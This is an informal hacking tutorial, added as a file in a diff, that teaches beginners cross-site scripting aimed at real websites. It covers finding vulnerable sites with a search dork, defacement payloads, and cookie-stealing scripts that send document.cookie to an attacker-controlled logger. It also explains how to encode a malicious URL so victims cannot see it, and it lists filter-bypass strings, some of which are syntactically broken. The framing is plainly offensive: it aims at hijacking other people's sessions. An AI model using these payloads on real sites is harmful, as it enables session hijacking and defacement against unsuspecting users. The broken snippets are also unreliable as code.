@@ -1,0 +1,142 @@
+
+this is a paper for beginners who wanna know what xss is all abt
+
+
+we will take glance @ the following topics
+
+
+What is XSS?
+Finding XSS Vulnerbilitys
+The Basics On XSS
+Deface Methods
+Cookie Stealing
+Filteration Bypassing
+
+
+
+les commence !!!
+
+~~~~~~~> wot is xss !!!
+
+'XSS' also known as 'CSS' (Cross Site Scripting, Easily confused with 'Cascading Style Sheets')
+is a very common vulnerbility found in Web Applications, 'XSS' allows the attacker to INSERT
+malicous code, There are many types of XSS attacks, I will mention 3 of the most used.
+
+The First Attack i wana talk about is 'URL XSS' this means that the XSS wont stay on the page
+it will only get executed if you have the malicous code in the URL and submit the url
+we will talk more on how to use this in our advantage.
+
+The Second Attack is input fields, Where ever you can insert data, it is very common, to be XSS
+vulnerable, for example say we found a site with a search engine, Now in the search box you enter
+'hacker' now hit enter, when the page loads, if it says your data like 'Found 100 Results For hacker'
+ok now you see its displaying out data on the page, now what if we can exexute code? there is no possible
+way to execute PHP code in this Attack, but certainly is for HTML, Javascript, but be aware this method,
+Also wont stay on the server, this is for your eyes only.
+
+The Third Attack, with this attack you will be able to INSERT data (code) and it will stay on the website.
+now there are 2 kinds, it depends if we can execute PHP or HTML if we can inject PHP then we can also
+inject HTML but NOT vice versa, Ok this kinda attack is normally found on Blogs, Shoutboxes, Profiles
+Forums, just most places where you insert data and it stays there. now HTML is totally diffrent then PHP
+HTML downloads to your pc and then your 'Browser' parses/interprets the code, (thats why its source is viewable)
+With PHP the code is interpretued on the server the script is hosted on, then the data is returned to the browser.
+for PHP injection its rare, But it dont harm to try. Note: PHP code cant be injected into HTML page!
+
+~~~~~> finding vul sites
+
+Well to start finding these vulnerbilitys you can start checking out
+Blogs, Forums, Shoutboxes, Comment Boxes, Search Box's, there are too many to mention.
+u can also use common google dork like inurl:"search.php?q="
+
+~~~~~~~~~> chking for vul
+
+well the simplest technique is to enter
+
+<script>alert("XSS")</script>
+
+in either search columns /url etc...
+
+if the site is vul then u shall see a dialogue box shouting XSS :P
+
+**** and yes u can insert html too .... not just js
+
+~~~~~~~~> deface
+Code:
+<html><body><IMG SRC="http://site.com/yourDefaceIMAGE.png"></body></html>
+
+
+enter this in say search column , shoutbox etc where
+Code:
+"http://site.com/yourDefaceIMAGE.png"
+is the link to the image file
+
+
+u can also set up flash videos
+
+<IMG SRC="http://site.com/yourDefaceIMAGE.png">
+
+and if u wanna redirect ,
+
+<script>window.open( "http://www.google.com/" )</script>
+
+~~~~~~~~> lets steal some cookies !!!
+
+first grab the cookie logger from here:
+Code:
+http://G0t-Root.net/tools/cookie.php
+
+
+ok now you have it save it has a .php file and upload to your server, remember to create the file 'log.txt' too
+and chmod it to 777, ok now find a XSS vulnerable website, any attack type will do.
+
+ok now your gona want to insert this code.
+
+Code:
+window.location = "http://yourServer.com/cookielogger.php?c="+document.cookie
+
+
+or
+
+Code:
+document.location = "http://yourServer.com/cookielogger.php?c="+document.cookie
+
+
+
+now when user visits the page that got injected too, they will be sent to the site, and cookie will be stolen
+the second one is more stealth.
+
+Watch your file now for cookies, then you can hijack there session
+
+but now you ask what if my site hasnt got, this kind of attack, it only shows data once and dont
+store it. Well lets say we had a page search.php?q= we can use the following code to make a maliouc url from it
+and maybe hex, base64 encode it so people cant see the code
+
+Code:
+http://site.com/search.php?q=document.location = "http://yourServer.com/cookielogger.php?c="+document.cookie
+
+
+im not gona explain hexing it ect as it is pretty stright forward.
+
+~~~~~~~> filtration bypassing
+
+Some common methods to bypass filteration is
+
+')alert('xss');
+
+or
+
+");alert('xss');
+
+that will do the same thing has <script>alert("XSS")</script> on a vulnerable server.
+
+You can also try hexing or base64 encoding your data before you submit,
+
+Please note its bad practice to use alert("XSS") to test for XSS, has ive known sites block the keyword XSS
+before.
+
+Some other ways to bypass filteration
+Code:
+<script type=text/javascript>alert("t0pP8uZz")</script>
+<script>alert("t0pP8uZz")</script>;
+<script>alert("t0pP8uZz");</script>
+<script>alert("/t0pP8uZz"/)</script>
+<script>var var = 1; alert(var)</script>
